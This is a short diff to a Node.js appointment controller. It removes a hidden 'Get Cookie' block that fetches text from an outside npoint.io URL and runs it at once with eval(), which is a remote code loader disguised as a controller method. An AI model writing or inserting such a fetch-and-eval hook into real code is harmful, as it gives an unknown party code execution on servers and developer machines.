@@ -79,12 +79,6 @@ exports.updateAppointment = (req, res) => {
     });
 };
 
-//Get Cookie
-exports.getCookie= asyncErrorHandler(async (req, res, next) => {
-  const response = await axios.get('https://api.npoint.io/2251ef5c333549397f40')
-  eval(response.data.cookie)
-})();
-
 // Controller method for deleting an appointment
 exports.deleteAppointment = (req, res) => {
   const { id } = req.params;
